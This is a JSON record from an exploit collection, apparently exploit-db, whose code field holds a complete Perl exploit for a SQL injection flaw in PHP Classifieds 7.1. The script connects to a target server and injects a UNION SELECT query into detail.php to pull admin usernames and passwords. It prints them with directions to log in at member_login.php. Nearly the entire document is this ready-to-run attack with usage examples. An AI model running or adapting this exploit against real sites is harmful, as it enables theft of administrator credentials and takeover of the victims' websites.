{
  "id": "2720",
  "title": "PHP Classifieds 7.1 - &#039;detail.php&#039; SQL Injection",
  "cve": "CVE-2006-5828",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#[Script Name: Php Classifieds <= 7.1 (detail.php) Remote SQL Injection Exploit\r\n#[Coded by   : ajann\r\n#[Author     : ajann\r\n#[Contact    : :(\r\nuse IO::Socket;\r\nif(@ARGV < 3){\r\nprint \"\r\n[========================================================================\r\n[//  Php Classifieds <= 7.1 (detail.php) Remote SQL Injection Exploit\r\n[//           Usage: class.pl [target] [path] [userid]\r\n[//                   Example: class.pl victim.com / 1\r\n[//                   Example: class.pl victim.com /path/ 1\r\n[//                           Vuln&Exp : ajann\r\n[========================================================================\r\n\";\r\nexit();\r\n}\r\n#Local variables\r\n$classifiedsserver = $ARGV[0];\r\n$classifiedsserver =~ s/(http:\\/\\/)//eg;\r\n$classifiedshost = \"http://\".$classifiedsserver;\r\n$classifiedsport = \"80\";\r\n$classifiedsdir = $ARGV[1];\r\n$classifiedsfile = \"detail.php?id=1009&contact=1&user_id=\";\r\n$classifiedsend = \"member_login.php\";\r\n$classifiedstarget = \"1%20union%20select%20concat(adm_name,char(32),adm_pass)%20from%20phpclass_admins%20where%20adm_id%20like%20\".$ARGV[2];\r\n$classifiedstarget = $classifiedshost.$classifiedsdir.$classifiedsfile.$classifiedstarget;\r\n#Writing data to socket\r\nprint \"+**********************************************************************+\\n\";\r\nprint \"+ Trying to connect: $classifiedsserver\\n\";\r\n$classifieds = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$classifiedsserver\", PeerPort => \"$classifiedsport\") || die \"\\n+ Connection failed...\\n\";\r\nprint $classifieds \"GET $classifiedstarget\\n\";\r\nprint $classifieds \"Host: $classifiedsserver\\n\";\r\nprint $classifieds \"Accept: */*\\n\";\r\nprint $classifieds \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\n#Getting\r\nwhile($answer = <$classifieds>) {\r\nif ($answer =~ /<b>(.*?)<\\/b>/){ \r\nprint \"+ Exploit succeed! Getting admin information.\\n\";\r\nprint \"+ ---------------- +\\n\";\r\nprint \"+ Username and Password: $1\\n\";\r\nprint \"+ Lets go $classifiedshost$classifiedsdir$classifiedsend and\\n+ Login with this information. \\n\";\r\nexit();\r\n}\r\n\r\nif ($answer =~ /Ad removed or not yet approved/) { \r\nprint \"+ Exploit Failed : ( \\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n\r\nif ($answer =~ /Internal Server Error/) {\r\nprint \"+ Exploit Failed : (  \\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n}\r\nprint \"+ Exploit failed :(\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\n\r\n# milw0rm.com [2006-11-05]",
  "url": "https://www.exploit-db.com/exploits/2720"
}